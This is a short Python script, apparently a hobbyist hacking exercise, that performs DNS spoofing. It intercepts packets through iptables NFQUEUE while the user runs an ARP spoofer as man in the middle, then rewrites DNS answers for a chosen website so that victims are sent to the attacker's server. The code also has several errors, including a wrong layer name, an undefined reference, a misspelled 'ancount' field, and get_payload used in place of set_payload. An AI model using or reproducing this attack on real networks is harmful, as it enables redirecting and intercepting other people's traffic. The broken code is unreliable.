#!/usr/bin/env python

# Domain Name Server (DNS)

# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> run this command in your linux terminal first

# but if you are testing it in your own machine you would need to use --> iptables - I INPUT -j NFQUEUE --queue-num 0
# and then Run this --> iptables -I INPUT -j NFQUEUE --queue-num 0

# then run the arp spoofer, so that you are the man in the middle.
# After you work is done make sure to delete the iptables using the command -> iptables --flush

import netfilterqueue  # You need to install this package in your device using the pip command
                        # - pip install netfilterqueue.
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.ip(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        website = input("Enter the Website that you want to Spoof : ")

        # Specify the full name of the website. Like = "www.google.com"
        # For example if you input 'www.bing.com' then the script will capture it when the victim visits that webpage.

        your_ip = input("Enter the IP Address of your server : ")

        if website in queue:
            print("[+] Spoofing Target... ")
            answer = scapy.DNSRR(rrname=qname, rdata=your_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.get_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

